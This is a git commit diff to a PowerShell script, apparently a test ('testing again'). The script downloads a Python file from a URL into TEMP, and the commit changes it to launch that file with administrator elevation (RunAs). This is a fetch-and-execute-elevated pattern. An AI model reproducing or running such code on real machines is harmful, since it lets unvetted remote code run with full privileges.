80e0a13c77d7b80d18101b4c32926ffc99b23765
4id3n360 <aidenaaron005@gmail.com>
2025-07-15 02:08:45 -0700

    testing again

--- script.ps1
+++ script.ps1
@@ -5,4 +5,4 @@ $localScriptPath = "$env:TEMP\downloaded_script.py"
 
 Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localScriptPath
 
-Start-Process FilePath "notepad" -Verb RunAs
+Start-Process $localScriptPath -Verb RunAs
